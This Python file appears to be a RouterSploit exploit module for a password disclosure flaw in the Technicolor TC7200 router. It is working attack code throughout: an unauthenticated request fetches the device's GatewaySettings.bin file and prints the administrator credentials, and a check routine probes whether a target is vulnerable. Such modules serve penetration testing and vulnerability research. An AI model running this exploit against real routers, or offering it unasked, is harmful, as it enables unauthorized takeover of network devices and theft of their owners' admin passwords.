import requests

from routersploit import (
    exploits,
    sanitize_url,
    print_error,
    print_success,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Technicolor TC7200 password disclosure vulnerability.
    If the target is vulnerable, it allows read credentials for administration user.
    """
    __info__ = {
        'name': 'Technicolor TC7200 Password Disclosure',
        'description': 'Module exploits Technicolor TC7200 password disclosure vulnerability which allows fetching administration\'s password.',
        'authors': [
            'Jeroen - IT Nerdbox',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/31894/',
        ],
        'targets': [
            'Technicolor TC7200',
        ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')
    port = exploits.Option(80, 'Target Port')

    def run(self):
        url = sanitize_url("{}:{}/goform/system/GatewaySettings.bin".format(self.target, self.port))

        try:
            r = requests.get(url, verify=False)
        except requests.exceptions.ConnectionError:
            print_error("Connection error: %s" % url)
            return


        if r.status_code == 200 and "0MLog" in r.text:
            print_success("Exploit success")
            print r.text
        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")

    def check(self):
        url = sanitize_url("{}:{}/goform/system/GatewaySettings.bin".format(self.target, self.port))

        try:
            r = requests.get(url, verify=False)
        except:
            return None  # could not verify

        if r.status_code == 200 and "0MLog" in r.text:
            return True  # target vulnerable

        return False  # target is not vulnerable
